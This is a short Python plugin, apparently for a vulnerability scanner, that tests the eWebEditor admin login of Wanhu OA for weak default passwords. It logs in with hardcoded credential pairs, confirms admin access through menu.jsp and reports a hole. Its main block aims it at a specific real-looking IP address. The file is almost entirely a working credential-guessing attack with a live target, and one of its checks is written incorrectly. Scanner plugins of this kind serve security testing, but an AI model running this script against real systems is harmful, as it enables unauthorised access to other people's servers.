#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = ng man
#_PlugName_ =万户OA eWebEditor编辑后台弱口令
#references:http://www.wooyun.org/bugs/wooyun-2010-075200


def assign(service, arg):
    if service == "whezeip":
        return True, arg

def audit(arg):
    header = "Content-Type: application/x-www-form-urlencoded"
    usernames = ['admin','ezoffice']
    passowrds = ['admin','qwertyuiop123','ezoffice']
    for username in usernames:
        for password in passowrds:
            data = "usr={0}&pwd={1}".format(username,password)
            vulurl = '{url}defaultroot/public/edit/admin/login.jsp?action=login'.format(url=arg)
            code, head,res, errcode, _ = curl.curl2(vulurl,header=header, post=data,location=True)
            if code == 200 and 'menu.jsp' in res:
                vef_url = "{url}defaultroot/public/edit/admin/menu.jsp".format(url=arg)
                vef_code, head,vef_res, errcode, _ = curl.curl2(vef_url)
                if vef_code == 200 and 'modipwd.jsp' and 'modilicense.jsp' in vef_res:
                    security_hole(vulurl+'\npost:'+data)

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip', 'http://125.95.19.222:7001/')[1])